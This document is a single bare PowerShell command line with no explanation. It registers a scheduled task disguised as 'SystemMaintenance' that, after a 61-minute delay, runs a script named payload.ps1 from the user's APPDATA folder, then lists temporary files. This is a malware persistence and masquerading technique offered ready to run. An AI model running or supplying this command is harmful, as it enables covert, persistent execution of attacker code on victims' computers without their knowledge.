$TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "powershell.exe -NoP -File `"$env:APPDATA\payload.ps1`""; $TaskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(61); Register-ScheduledTask -TaskName "SystemMaintenance" -Action $TaskAction -Trigger $TaskTrigger -Force; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
